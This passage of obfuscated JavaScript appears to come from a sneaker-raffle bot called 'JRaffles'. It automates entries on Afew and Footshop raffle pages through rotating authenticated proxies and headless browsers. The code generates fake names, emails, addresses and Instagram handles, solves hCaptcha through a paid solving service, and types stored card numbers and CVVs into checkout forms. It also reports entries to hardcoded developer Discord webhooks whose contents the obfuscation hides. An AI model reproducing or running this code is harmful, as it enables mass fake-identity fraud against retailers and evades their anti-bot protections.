                                        'value': '' + _0x2922c2,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x550cc4['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0xd30cf5['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x26b8e9,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x21c080['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x38b36b(_0x105351, _0x1acaa7) {
    var _0x2b2408 = _0x105351[_0x1acaa7]['Address1']['split'](''), _0x3f71ca = _0x105351[_0x1acaa7]['Address2']['split'](''), _0x26313e = _0x105351[_0x1acaa7]['Email']['split']('@');
    for (var _0x11ecd3 = 0x0; _0x11ecd3 < _0x2b2408['length']; _0x11ecd3++) {
        if (_0x2b2408[_0x11ecd3] == 'X') {
            var _0xbb0d91 = Math['round'](Math['random']() * (_0x4d6d87['length'] - 0x1));
            _0x2b2408[_0x11ecd3] = _0x1defe2[_0xbb0d91];
        }
    }
    ;
    for (var _0x11ecd3 = 0x0; _0x11ecd3 < _0x3f71ca['length']; _0x11ecd3++) {
        if (_0x3f71ca[_0x11ecd3] == 'X') {
            var _0xbb0d91 = Math['round'](Math['random']() * (_0x4d6d87['length'] - 0x1));
            _0x3f71ca[_0x11ecd3] = _0x1defe2[_0xbb0d91];
        }
    }
    ;
    _0x105351[_0x1acaa7]['FirstName'] == 'RANDOM' && (_0x105351[_0x1acaa7]['FirstName'] = _0x42bce6['first']());
    _0x105351[_0x1acaa7]['LastName'] == 'RANDOM' && (_0x105351[_0x1acaa7]['LastName'] = _0x42bce6['last']());
    _0x26313e[0x0] == 'RANDOM' ? _0x26313e[0x0] = '' + _0x42bce6['first']() + _0x42bce6['last']() + '@' : _0x26313e[0x0] = _0x26313e[0x0] + '@';
    _0x105351[_0x1acaa7]['Email'] = _0x26313e['join'](''), _0x105351[_0x1acaa7]['Address1'] = _0x2b2408['join'](''), _0x105351[_0x1acaa7]['Address2'] = _0x3f71ca['join']('');
    _0x105351[_0x1acaa7]['Phone'] == 'RANDOM' && (_0x105351[_0x1acaa7]['Phone'] = '0' + _0x56db67(0x5f5e100, 0x3b9ac9ff));
    if (_0x105351[_0x1acaa7]['Follower'] == 'RANDOM') {
        var _0x55144b = _0x56db67(0x1, 0x270f);
        _0x105351[_0x1acaa7]['Follower'] = '' + _0x42bce6['first']() + _0x42bce6['last']() + _0x55144b + '\x20';
    }
    _0x105351[_0x1acaa7]['HouseNumber'] == 'RANDOM' && (_0x105351[_0x1acaa7]['HouseNumber'] = _0x56db67(0x1, 0xc8));
    if (_0x105351[_0x1acaa7]['Address1'] == 'RANDOM') {
        var _0x3efa4d = Math['round'](Math['random']() * (_0x4d6d87['length'] - 0x1)), _0x18c3bb = _0x1defe2[_0x3efa4d];
        _0x105351[_0x1acaa7]['Address1'] = _0x42bce6['last']() + 'straat', _0x105351[_0x1acaa7]['Zip'] == '' && (_0x105351[_0x1acaa7]['Postcode'] = _0x56db67(0x3e8, 0x270f) + '\x20' + _0x18c3bb + _0x18c3bb, _0x105351[_0x1acaa7]['Zip'] = _0x105351[_0x1acaa7]['Postcode']), _0x105351[_0x1acaa7]['HouseNumber'] = '' + _0x56db67(0x1, 0xc8);
    }
    return;
}
;
function _0x38aeb0() {
    let _0x4264a5 = proxyFile['split']('\x0a'), _0x8c4a06 = _0x4264a5['map']((_0x5c98c6, _0x30d5a3) => {
        sanatizeProxy = _0x5c98c6['replace']('\x0d', '');
        if (_0x4264a5[_0x30d5a3 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x8c4a06;
}
;
async function _0x179ca7(_0x38cfd0) {
    var _0x245c4c = _0x38cfd0[0x1]['split'](':');
    const _0x138ef7 = await _0x168014['launch']({
        'headless': !![],
        'args': ['--proxy-server=' + _0x245c4c[0x0] + ':' + _0x245c4c[0x1] + ',--no-sandbox\x27,\x0a\x20\x20\x20\x20\x20\x20\x27--disable-setuid-sandbox,--force-device-scale-factor=0.3']
    });
    try {
        const _0x15ad00 = await _0x138ef7['newPage']();
        await _0x15ad00['authenticate']({
            'username': '' + _0x245c4c[0x2],
            'password': '' + _0x245c4c[0x3]
        }), console['log'](_0x57a400() + '\x20[' + _0x388f09[taskModule]['name'] + ']\x20Afew\x20Scraper\x20started'), await _0x15ad00['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x15ad00['setRequestInterception'](!![]), _0x15ad00['on']('request', _0xfe2443 => {
            _0xfe2443['resourceType']() === 'image' || _0xfe2443['resourceType']() === 'font' || _0xfe2443['resourceType']() === 'media' ? _0xfe2443['abort']() : _0xfe2443['continue']();
        }), await _0x15ad00['goto']('https://en.afew-store.com/collections/sneaker-raffles'), console['log'](_0x57a400() + '\x20[' + _0x388f09[taskModule]['name'] + ']\x20Looking\x20for\x20Raffles'), await _0x15ad00['waitForTimeout'](0xbb8), await _0x15ad00['waitForSelector']('.product-card');
        const _0x749d2e = await _0x15ad00['$$eval']('a.product-card', _0x2d3f60 => {
            return _0x2d3f60['map'](_0x1fc3b6 => _0x1fc3b6['href']);
        });
        return _0x2fd131 = _0x749d2e;
    } catch (_0x487fd7) {
        console['log']('\x20' + _0x487fd7);
    } finally {
        _0x138ef7['close'](), console['clear']();
    }
}
;
async function _0x498969(_0xa98a26, _0x2f7fe8, _0x27cf7a, _0x23cedd, _0x528239) {
    _0x2f7fe8 != 'ver' && await _0x38b36b(_0x23cedd, _0xa98a26);
    if (_0xd30cf5['useRandomProxy'] = ![])
        var _0xbbe02 = _0x528239[_0xa98a26]['split'](':');
    else
        var _0x40c735 = Math['round'](Math['random']() * (_0x528239['length'] - 0x1)), _0xbbe02 = _0x528239[_0x40c735]['split'](':');
    var _0x93c5f0 = _0x27cf7a['data'];
    _0x2f7fe8 != 'ver' && (_0x93c5f0['data']['attributes']['properties']['$first_name'] = '' + _0x23cedd[_0xa98a26]['FirstName'], _0x93c5f0['data']['attributes']['properties']['$last_name'] = '' + _0x23cedd[_0xa98a26]['LastName'], _0x93c5f0['data']['attributes']['properties']['$address1'] = _0x23cedd[_0xa98a26]['Address1'] + '\x20' + _0x23cedd[_0xa98a26]['HouseNumber'] + '\x20' + _0x23cedd[_0xa98a26]['Address2'], _0x93c5f0['data']['attributes']['properties']['$zip'] = '' + _0x23cedd[_0xa98a26]['Zip'], _0x93c5f0['data']['attributes']['properties']['$city'] = '' + _0x23cedd[_0xa98a26]['City'], _0x93c5f0['data']['attributes']['properties']['$country'] = '' + _0x23cedd[_0xa98a26]['Country'], _0x93c5f0['data']['attributes']['properties']['Size'] = '' + _0x23cedd[_0xa98a26]['Size'], _0x93c5f0['data']['attributes']['properties']['Instagram\x20Handle'] = '' + _0x23cedd[_0xa98a26]['Follower'], _0x2f7fe8 == 'exp' ? _0x93c5f0['data']['attributes']['email'] = '' + _0x23cedd[_0xa98a26]['FirstName'] + _0x23cedd[_0xa98a26]['LastName'] + _0xd30cf5['catchall'] : _0x93c5f0['data']['attributes']['email'] = '' + _0x23cedd[_0xa98a26]['Email']);
    var _0x38e44b = {
        'jar': _0x2ae52a,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x27cf7a['url'],
        'headers': _0x27cf7a['headers'],
        'body': JSON['stringify'](_0x93c5f0),
        'proxy': 'http://' + _0xbbe02[0x2] + ':' + _0xbbe02[0x3] + '@' + _0xbbe02[0x0] + ':' + _0xbbe02[0x1]
    };
    return _0x2f7fe8 === 'ver' && (_0x38e44b['method'] = 'GET'), new Promise(function (_0x337d35, _0xe55082) {
        callback = async (_0x5ae3b5, _0x2c4615, _0x37e1e5) => {
            if (!_0x5ae3b5 && _0x2c4615['statusCode'] == 0xca || !_0x5ae3b5 && _0x2c4615['statusCode'] == 0xc8) {
                _0x337d35(console['log'](_0x41434e['green'](_0x57a400() + '\x20[' + _0x27cf7a['name'] + ']\x20Task\x20' + (_0xa98a26 + 0x1) + ':\x20Raffle\x20Entered!')));
                if (_0x2f7fe8 != 'ver') {
                    var _0xeeea77 = await _0xff2c9f(_0x23cedd[_0xa98a26], _0x27cf7a, 'dev', ![]), _0x16debb = await _0xff2c9f(_0x23cedd[_0xa98a26], _0x27cf7a, 'pub', ![]);
                    const _0x59824c = {
                        'succesDEVMSG': { 'embeds': [_0xeeea77] },
                        'succesPUBMSG': { 'embeds': [_0x16debb] }
                    };
                    if (_0xd30cf5['webhook'] != undefined && _0xd30cf5['webhook'] != '')
                        try {
                            await _0x5f2c92(_0xd30cf5['webhook'], _0x59824c['succesDEVMSG']);
                        } catch {
                        }
                    await _0x4f800b(0xc8), await _0x5f2c92(_0x45c968, _0x59824c['succesDEVMSG']), await _0x4f800b(0xc8);
                    try {
                        await _0x5f2c92(_0x302219, _0x59824c['succesPUBMSG']);
                    } catch {
                    }
                } else {
                    if (_0x2f7fe8 == 'ver') {
                        var _0xeeea77 = await _0xff2c9f(null, _0x27cf7a, 'ver', ![]);
                        const _0x44856b = {
                            'succesDEVMSG': { 'embeds': [_0xeeea77] },
                            'succesPUBMSG': { 'embeds': [_0x16debb] }
                        };
                        await _0x5f2c92(_0x5e1d93, _0x44856b['succesDEVMSG']);
                    }
                }
            } else {
                if (_0x2f7fe8 != 'ver') {
                    var _0x4f6720 = '' + _0x5ae3b5, _0x26e7bf = await _0xff2c9f(_0x23cedd[_0xa98a26], _0x27cf7a, 'dev', !![], _0x4f6720), _0x4ffd7b = {};
                    _0x4ffd7b['errorDEV'] = { 'embeds': [_0x26e7bf] }, _0xd30cf5['webhook'] != undefined && _0xd30cf5['webhook'] != '' && await _0x5f2c92(_0xd30cf5['webhook'], _0x4ffd7b['errorDEV']), await _0x5f2c92(_0x3afc50, _0x4ffd7b['errorDEV']);
                }
                _0xe55082(console['log'](_0x57a400() + '\x20[' + _0x27cf7a['name'] + ']\x20Task\x20' + (_0xa98a26 + 0x1) + ':\x20' + _0x5ae3b5));
            }
        };
        try {
            _0x2f7fe8 === 'ver' ? console['log'](_0x57a400() + '\x20[' + _0x27cf7a['name'] + ']\x20Task\x20' + (_0xa98a26 + 0x1) + ':\x20Verifying.') : console['log'](_0x57a400() + '\x20[' + _0x27cf7a['name'] + ']\x20Task\x20' + (_0xa98a26 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x93c5f0['data']['attributes']['email']), _0x3c3188(_0x38e44b, callback);
        } catch (_0x62d984) {
            console['log'](_0x57a400() + '\x20Task\x20' + (_0xa98a26 + 0x1) + ':\x20' + _0x62d984);
        }
    });
}
;
async function _0x4b4369(_0x22d05d, _0x4153b9, _0x580c42) {
    _0x168014['use'](_0x4554c9()), _0x168014['use'](_0x374957({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xd30cf5['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x1b048e = 0x0; _0x1b048e < _0x22d05d['length']; _0x1b048e++) {
        var _0x5b17be, _0x4f31fa = '', _0x53c518 = 0x0, _0x57b19a = [{
            'type': 'rich',
            'title': 'Succesful\x20Footshop\x20entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x434d06
                },
                {
                    'name': 'Product',
                    'value': '' + _0x22d05d[_0x1b048e]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x22d05d[_0x1b048e]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0xd30cf5['footshopDelay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x26b8e9
                }
            ]
        }], _0x1374a6 = await _0xff2c9f(_0x22d05d[_0x1b048e], _0x580c42, 'dev', ![]), _0x50fcc3 = await _0xff2c9f(_0x22d05d[_0x1b048e], _0x580c42, 'pub', ![]);
        const _0x3645fe = {
            'succesDEVMSG': { 'embeds': [_0x1374a6] },
            'succesPUBMSG': { 'embeds': [_0x50fcc3] }
        }, _0x502694 = { 'embeds': _0x57b19a };
        await _0x38b36b(_0x22d05d, _0x1b048e);
        if (_0x22d05d[_0x1b048e]['Email'] == '' || _0x22d05d[_0x1b048e]['FirstName'] == '' || _0x22d05d[_0x1b048e]['LastName'] == '' || _0x22d05d[_0x1b048e]['Country'] == '' || _0x22d05d[_0x1b048e]['Size'] == '' || _0x22d05d[_0x1b048e]['Address1'] == '' || _0x22d05d[_0x1b048e]['Zip'] == '') {
            console['log'](_0x57a400() + '\x20[' + _0x580c42['name'] + ']\x20Task\x20' + (_0x1b048e + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x22d05d[_0x1b048e]['Email'] == '' || _0x22d05d[_0x1b048e]['FirstName'] == '' || _0x22d05d[_0x1b048e]['LastName'] == '' || _0x22d05d[_0x1b048e]['Country'] == '' || _0x22d05d[_0x1b048e]['Size'] == '' || _0x22d05d[_0x1b048e]['Address1'] == '' || _0x22d05d[_0x1b048e]['Zip'] == '' || _0x22d05d[_0x1b048e]['Phone'] == '') {
            console['log'](_0x57a400() + '\x20[' + _0x580c42['name'] + ']\x20Task\x20' + (_0x1b048e + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        const _0x1482fa = '' + _0x22d05d[_0x1b048e]['Url'];
        if (_0xd30cf5['useRandomProxy'] = ![])
            var _0x1d502e = _0x4153b9[_0x1b048e]['split'](':');
        else
            var _0x1d8fd0 = Math['round'](Math['random']() * (_0x4153b9['length'] - 0x1)), _0x1d502e = _0x4153b9[_0x1d8fd0]['split'](':');
        const _0x160dfe = await _0x168014['launch']({
            'headless': !![],
            'args': ['--proxy-server=' + _0x1d502e[0x0] + ':' + _0x1d502e[0x1]]
        });
        try {
            const _0x1d3b7f = await _0x160dfe['newPage']();
            await _0x1d3b7f['authenticate']({
                'username': '' + _0x1d502e[0x2],
                'password': '' + _0x1d502e[0x3]
            }), console['log'](_0x57a400() + '\x20[' + _0x580c42['name'] + ']\x20Task\x20' + (_0x1b048e + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1d3b7f['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x1d3b7f['setRequestInterception'](!![]), _0x1d3b7f['on']('request', _0x11c591 => {
                _0x11c591['resourceType']() === 'image' || _0x11c591['resourceType']() === 'font' || _0x11c591['resourceType']() === 'media' ? _0x11c591['abort']() : _0x11c591['continue']();
            }), await _0x1d3b7f['goto'](_0x1482fa), await _0x4f800b(0xbb8), await _0x1d3b7f['waitForSelector']('.control__JhutY'), await _0x1d3b7f['click']('.control__JhutY'), await _0x4f800b(0x1f4);
            if (_0x22d05d[_0x1b048e]['Size'] != 'RANDOM')
                try {
                    const _0x184d26 = await _0x1d3b7f['$x']('//div[contains(text(),\x20\x27' + _0x22d05d[_0x1b048e]['Size'] + '\x27)]');
                    await _0x184d26[0x0]['click']();
                } catch {
                    console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x580c42['name'] + ']\x20Task\x20' + (_0x1b048e + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                    continue;
                }
            else {
                const _0x37302d = await _0x1d3b7f['$$']('.options__3UQpT\x20>\x20div.row');
                var _0x17e41f = Math['round'](Math['random']() * (_0x37302d['length'] - 0x1));
                await _0x37302d[_0x17e41f]['click']();
            }
            await _0x4f800b(0x4b0);
            const _0x30d185 = await _0x1d3b7f['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
            await _0x30d185[0x0]['click'](), await _0x1d3b7f['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x57a400() + '\x20[' + _0x580c42['name'] + ']\x20Task\x20' + (_0x1b048e + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x1d3b7f['type']('input[name=\x22email\x22]', '' + _0x22d05d[_0x1b048e]['Email']), await _0x4f800b(0x640), await _0x1d3b7f['type']('input[name=\x22phone\x22]', '' + _0x22d05d[_0x1b048e]['Phone']), await _0x4f800b(0x4b0), await _0x1d3b7f['click']('button.btn.continue-button__1RtsS'), await _0x4f800b(0x4b0);
            try {
                await _0x1d3b7f['type']('input[name=\x22firstName\x22]', '' + _0x22d05d[_0x1b048e]['FirstName']), await _0x4f800b(0x258);
            } catch {
                const _0x5daca8 = await _0x1d3b7f['$$eval']('.invalid-feedback\x20>\x20div', _0x34c6df => {
                    return _0x34c6df['map'](_0x29630f => _0x29630f['innerText']);
                });
                console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x580c42['name'] + ']\x20Task\x20' + (_0x1b048e + 0x1) + '\x20:\x20' + _0x5daca8));
                continue;
            }
            await _0x1d3b7f['type']('input[name=\x22lastName\x22]', '' + _0x22d05d[_0x1b048e]['LastName']), await _0x4f800b(0xc8), await _0x1d3b7f['type']('input[name=\x22instagramUsername\x22]', '' + _0x22d05d[_0x1b048e]['Follower']), await _0x4f800b(0x4b0), await _0x1d3b7f['click']('button.btn.continue-button__1RtsS'), await _0x4f800b(0x3e8), console['log'](_0x57a400() + '\x20[' + _0x580c42['name'] + ']\x20Task\x20' + (_0x1b048e + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x1d3b7f['select']('select[name=\x22country\x22]', '' + _0x22d05d[_0x1b048e]['Country']), await _0x4f800b(0x2bc), await _0x1d3b7f['type']('input[name=\x22streetName\x22]', '' + _0x22d05d[_0x1b048e]['Address1']), await _0x4f800b(0x258), await _0x1d3b7f['type']('input[name=\x22houseNumber\x22]', _0x22d05d[_0x1b048e]['HouseNumber'] + '\x20' + _0x22d05d[_0x1b048e]['Address2']), await _0x4f800b(0xc8), await _0x1d3b7f['type']('input[name=\x22postalCode\x22]', '' + _0x22d05d[_0x1b048e]['Zip']), await _0x4f800b(0x1f4), await _0x1d3b7f['type']('input[name=\x22city\x22]', '' + _0x22d05d[_0x1b048e]['City']), await _0x4f800b(0x4b0), await _0x1d3b7f['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x4f800b(0x4b0), await _0x1d3b7f['click']('button.btn.continue-button__1RtsS'), await _0x4f800b(0x4b0), console['log'](_0x57a400() + '\x20[' + _0x580c42['name'] + ']\x20Task\x20' + (_0x1b048e + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x1d3b7f['solveRecaptchas'](), console['log'](_0x57a400() + '\x20[' + _0x580c42['name'] + ']\x20Task\x20' + (_0x1b048e + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x4f800b(0xbb8), await _0x1d3b7f['click']('button.btn.continue-button__1RtsS'), await _0x4f800b(0x1388), console['log'](_0x57a400() + '\x20[' + _0x580c42['name'] + ']\x20Task\x20' + (_0x1b048e + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x1d3b7f['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x1d3b7f['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4f800b(0x4b0), await _0x1d3b7f['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x22d05d[_0x1b048e]['CardNumber']), await _0x4f800b(0x320), await _0x1d3b7f['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x1d3b7f['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x22d05d[_0x1b048e]['ExpiryDate']), await _0x4f800b(0x4b0), await _0x1d3b7f['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x1d3b7f['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x22d05d[_0x1b048e]['CVV']), await _0x4f800b(0x226), await _0x1d3b7f['type']('input[name=\x22holderName\x22]', '' + _0x22d05d[_0x1b048e]['NameOnCard']), await _0x4f800b(0x226), await _0x1d3b7f['click']('button.adyen-checkout__button'), console['log'](_0x57a400() + '\x20[' + _0x580c42['name'] + ']\x20Task\x20' + (_0x1b048e + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x1d3b7f['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x4f800b(0xbb8);
            } catch (_0x5c51bf) {
                console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x580c42['name'] + ']\x20Task\x20' + (_0x1b048e + 0x1) + '\x20:\x203DS\x20Failed')), _0x5b17be = '3DS\x20Error\x20' + _0x5c51bf;
                var _0x140d39 = await _0xff2c9f(_0x22d05d[_0x1b048e], _0x580c42, 'dev', !![], _0x5b17be);
                _0x3645fe['errorDEV'] = { 'embeds': [_0x140d39] };
                _0xd30cf5['webhook'] != undefined && _0xd30cf5['webhook'] != '' && await _0x5f2c92(_0xd30cf5['webhook'], _0x3645fe['errorDEV']);
                await _0x5f2c92(_0x3afc50, _0x3645fe['errorDEV']);
                continue;
            }
            console['log'](_0x41434e['green'](_0x57a400() + '\x20[' + _0x580c42['name'] + ']\x20Task\x20' + (_0x1b048e + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            if (_0xd30cf5['webhook'] != undefined && _0xd30cf5['webhook'] != '')
                try {
                    await _0x5f2c92(_0xd30cf5['webhook'], _0x3645fe['succesDEVMSG']);
                } catch {
                }
            await _0x4f800b(0xc8), await _0x5f2c92(_0x45c968, _0x3645fe['succesDEVMSG']), await _0x4f800b(0xc8);
            try {
                await _0x5f2c92(_0x302219, _0x3645fe['succesPUBMSG']);
            } catch {
            }
        } catch (_0x2cd979) {
            console['log'](_0x57a400() + '\x20[' + _0x580c42['name'] + ']\x20Task\x20' + (_0x1b048e + 0x1) + '\x20:\x20' + _0x2cd979), _0x5b17be = '' + _0x2cd979;
            var _0x140d39 = await _0xff2c9f(_0x22d05d[_0x1b048e], _0x580c42, 'dev', !![], _0x5b17be);
            _0x3645fe['errorDEV'] = { 'embeds': [_0x140d39] }, _0xd30cf5['webhook'] != undefined && _0xd30cf5['webhook'] != '' && await _0x5f2c92(_0xd30cf5['webhook'], _0x3645fe['errorDEV']), await _0x5f2c92(_0x3afc50, _0x3645fe['errorDEV']), _0x4f31fa = 'yes';
        } finally {
            _0x160dfe['close']();
            if (_0x4f31fa == 'yes' && _0x53c518 != 0x5) {
                console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x580c42['name'] + ']\x20Task\x20' + (_0x1b048e + 0x1) + '\x20:\x20Retrying')), _0x1b048e = _0x1b048e - 0x1, _0x53c518 = _0x53c518 + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0xd30cf5['footshopDelay'] + '\x20ms'), await _0x4f800b(_0xd30cf5['footshopDelay']);
        }
    }
}
afewFunction = async (_0x3696df, _0x4425b7, _0x17541c, _0x5c94c5, _0x2f9e29) => {
    for (var _0x515d9c = 0x0; _0x515d9c < _0x5c94c5['length']; _0x515d9c++) {
        _0xd30cf5['AfewDelay'] = _0xd30cf5['delay'];
        var _0x3315a5, _0x141f42 = '', _0x1a2432 = 0x0;
        _0x5c94c5[_0x515d9c]['Url'] = _0x3696df, _0x4bfd08(_0x17541c['name'] + '\x20Task\x20' + (_0x515d9c + 0x1) + '\x20/\x20' + _0x5c94c5['length'] + '\x20||\x20File:\x20' + _0x493993 + '\x20Proxies:\x20' + _0x42a4ad), await _0x38b36b(_0x5c94c5, _0x515d9c);
        var _0x48d75f = await _0xff2c9f(_0x5c94c5[_0x515d9c], _0x17541c, 'dev', ![]), _0xc658e2 = await _0xff2c9f(_0x5c94c5[_0x515d9c], _0x17541c, 'pub', ![]);
        const _0xee132e = {
            'succesDEVMSG': { 'embeds': [_0x48d75f] },
            'succesPUBMSG': { 'embeds': [_0xc658e2] }
        };
        if (_0x5c94c5[_0x515d9c]['Email'] == '' || _0x5c94c5[_0x515d9c]['FirstName'] == '' || _0x5c94c5[_0x515d9c]['LastName'] == '' || _0x5c94c5[_0x515d9c]['Country'] == '' || _0x5c94c5[_0x515d9c]['Size'] == '' || _0x5c94c5[_0x515d9c]['Address1'] == '' || _0x5c94c5[_0x515d9c]['Zip'] == '') {
            console['log'](_0x57a400() + '\x20[' + _0x17541c['name'] + ']\x20Task\x20' + (_0x515d9c + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0xd30cf5['useRandomProxy'] = ![])
            var _0x4d1ce1 = _0x2f9e29[_0x515d9c]['split'](':');
        else
            var _0x18ecb4 = Math['round'](Math['random']() * (_0x2f9e29['length'] - 0x1)), _0x4d1ce1 = _0x2f9e29[_0x18ecb4]['split'](':');
        const _0x183abf = await _0x168014['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x4d1ce1[0x0] + ':' + _0x4d1ce1[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x2826e4 = await _0x183abf['newPage']();
            await _0x2826e4['setDefaultNavigationTimeout'](0x1d4c0), await _0x2826e4['authenticate']({
                'username': '' + _0x4d1ce1[0x2],
                'password': '' + _0x4d1ce1[0x3]
            }), console['log'](_0x57a400() + '\x20[' + _0x17541c['name'] + ']\x20Task\x20' + (_0x515d9c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2826e4['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x2826e4['setRequestInterception'](!![]), _0x2826e4['on']('request', _0x2e81dd => {
                _0x2e81dd['resourceType']() === 'image' || _0x2e81dd['resourceType']() === 'font' || _0x2e81dd['resourceType']() === 'media' ? _0x2e81dd['abort']() : _0x2e81dd['continue']();
            }), await _0x2826e4['goto'](_0x3696df, { 'waitUntil': 'networkidle2' }), console['log'](_0x57a400() + '\x20[' + _0x17541c['name'] + ']\x20Task\x20' + (_0x515d9c + 0x1) + '\x20:\x20Gathering\x20cookies'), await _0x2826e4['waitForTimeout'](0xfa0), console['log'](_0x57a400() + '\x20[' + _0x17541c['name'] + ']\x20Task\x20' + (_0x515d9c + 0x1) + '\x20:\x20Cookies\x20received'), await _0x2826e4['waitForTimeout'](0x320);
            if (_0x5c94c5[_0x515d9c]['Size'] == 'RANDOM') {
                console['log'](_0x57a400() + '\x20[' + _0x17541c['name'] + ']\x20Task\x20' + (_0x515d9c + 0x1) + '\x20:\x20Choosing\x20random\x20size');
                const _0x31edf7 = await _0x2826e4['$$eval']('div.size-picker.mt-2\x20>\x20ul\x20>\x20li\x20>\x20a', _0x50c477 => {
                    return _0x50c477['map'](_0x212452 => _0x212452['href']);
                });
                var _0x187394 = Math['round'](Math['random']() * (_0x31edf7['length'] - 0x1));
                await _0x2826e4['goto']('' + _0x31edf7[_0x187394]);
            } else {
                console['log'](_0x57a400() + '\x20[' + _0x17541c['name'] + ']\x20Task\x20' + (_0x515d9c + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x5c94c5[_0x515d9c]['Size']);
                try {
                    const _0x3f8f4c = await _0x2826e4['$$eval']('li[data-original-title=\x22Größe\x20in\x20EU:\x20' + _0x5c94c5[_0x515d9c]['Size'] + '\x22]\x20>\x20a', _0x5bd8c2 => {
                        return _0x5bd8c2['map'](_0x32b1aa => _0x32b1aa['href']);
                    });
                    await _0x2826e4['goto']('' + _0x3f8f4c[0x0], { 'waitUntil': 'networkidle2' });
                } catch (_0x13839c) {
                    console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x17541c['name'] + ']\x20Task\x20' + (_0x515d9c + 0x1) + '\x20:\x20' + _0x13839c + '\x20Size\x20not\x20found')), _0x3315a5 = 'Size\x20Not\x20Found';
                    var _0x1409f6 = await _0xff2c9f(_0x5c94c5[_0x515d9c], _0x17541c, 'dev', !![], _0x3315a5);
                    _0xee132e['errorDEV'] = { 'embeds': [_0x1409f6] };
                    _0xd30cf5['webhook'] != undefined && _0xd30cf5['webhook'] != '' && await _0x5f2c92(_0xd30cf5['webhook'], _0xee132e['errorDEV']);
                    await _0x5f2c92(_0x3afc50, _0xee132e['errorDEV']);
                    continue;
                }
            }
            await _0x2826e4['waitForTimeout'](0x258), await _0x2826e4['type']('#raffle-instagram', '' + _0x5c94c5[_0x515d9c]['Follower'], { 'delay': 0x64 }), await _0x2826e4['waitForTimeout'](0x384), await _0x2826e4['click']('#raffle-terms'), await _0x2826e4['waitForTimeout'](0x384), await _0x2826e4['evaluate'](() => {
                const _0x41e43b = document['querySelector']('button.btn[name=\x27add\x27]');
                _0x41e43b['click']();
            }), await _0x2826e4['waitForTimeout'](0xbb8), await _0x2826e4['waitForSelector']('#checkout_email'), await _0x4f800b(0x3e8), console['log'](_0x57a400() + '\x20[' + _0x17541c['name'] + ']\x20Task\x20' + (_0x515d9c + 0x1) + '\x20:\x20Filling\x20Information');
            _0x4425b7 == 'sec' ? await _0x2826e4['type']('#checkout_email', '' + _0x5c94c5[_0x515d9c]['FirstName'] + _0x5c94c5[_0x515d9c]['LastName'] + _0xd30cf5['catchall'], 0x32) : await _0x2826e4['type']('#checkout_email', '' + _0x5c94c5[_0x515d9c]['Email'], 0x32);
